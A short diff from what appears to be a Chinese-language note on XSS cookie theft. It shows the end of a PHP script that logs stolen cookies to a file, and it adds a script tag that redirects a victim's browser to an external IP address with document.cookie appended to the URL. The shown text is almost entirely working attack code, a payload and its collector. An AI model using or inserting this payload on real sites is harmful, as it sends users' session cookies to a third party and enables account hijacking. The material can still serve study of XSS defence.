@@ -20,4 +20,6 @@ XSS注入在线脚本危害：
 	fwrite($log,$time.':    '. $cookie . "\n");
 	fclose($log);
 ?>
+
+<script>location.href="http://47.98.193.145/1.php?cookie="+document.cookie</script>
 ```
